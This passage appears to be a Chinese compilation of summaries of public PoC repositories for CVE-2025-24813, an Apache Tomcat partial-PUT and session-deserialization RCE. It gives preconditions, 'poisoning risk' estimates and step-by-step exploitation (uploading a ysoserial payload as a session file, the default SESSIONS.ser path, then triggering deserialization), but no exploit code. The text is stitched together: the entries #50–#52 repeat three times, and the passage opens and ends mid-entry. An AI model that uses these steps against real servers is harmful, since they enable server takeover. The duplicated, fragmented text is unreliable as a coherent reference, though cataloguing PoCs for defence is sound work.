3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

